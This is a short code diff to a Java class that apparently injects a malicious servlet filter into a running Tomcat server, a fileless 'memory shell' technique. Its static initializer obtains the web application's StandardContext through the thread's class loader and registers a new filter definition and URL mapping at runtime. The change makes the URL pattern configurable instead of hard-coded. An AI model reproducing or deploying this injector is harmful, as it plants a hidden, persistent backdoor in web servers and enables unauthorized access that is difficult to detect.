@@ -18,10 +18,11 @@ import java.util.*;
  */
 public class TFMSFromThread implements Filter {
 
+	public static String pattern;
+
 	static {
 		try {
-			final String name       = "su18" + System.nanoTime();
-			final String URLPattern = "/su18";
+			final String name = "su18" + System.nanoTime();
 
 			WebappClassLoaderBase webappClassLoaderBase =
 					(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
@@ -62,7 +63,7 @@ public class TFMSFromThread implements Filter {
 			standardContext.addFilterDef(filterDef);
 
 			FilterMap filterMap = new FilterMap();
-			filterMap.addURLPattern(URLPattern);
+			filterMap.addURLPattern(pattern);
 			filterMap.setFilterName(name);
 			filterMap.setDispatcher(DispatcherType.REQUEST.name());
 
